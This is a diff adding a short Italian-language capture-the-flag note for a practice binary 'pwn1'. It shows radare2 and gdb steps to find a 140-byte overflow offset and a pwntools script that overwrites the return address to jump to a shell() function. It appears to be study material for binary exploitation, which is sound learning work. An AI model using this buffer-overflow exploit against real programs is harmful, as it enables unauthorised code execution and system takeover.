@@ -81,3 +81,38 @@ io.interactive()
 
 
              
+######## example file: 1_enc_pwn1 ########
+
+#instructions:
+
+#quando hai un file.c lo guardi senza modificarlo  // in questo caso vediamo che c'è shell()
+
+#radare2 ./nome_file
+#aaaa
+#afl   //segnati indirizzo di shell
+#pdf @ sym.shell //ovviamente l'abbiamo visto dal codice su c    
+
+#gdb
+
+#pattern_create 300 pat300 //pat300 è il nome file
+#run < pat300  //se va bene da errore   
+
+#ricordati il tipo di invalid che ti sta dando    // invalid $PC adress
+
+#pattern_search
+#guarda nome errore e segnati offset  // es: EIP (è collegato a PC a quanto pare) e ha offset 140
+
+#We have everything to build our chain:
+
+from pwn import *
+
+p = process('./pwn1')
+garbage = 'a' * 140 #offset
+target_address = 0x080484ad #quello di shell
+address = p32(target_address)
+msgin = garbage.encode('ascii') + address
+p.sendline(msgin)
+p.interactive()
+
+
+
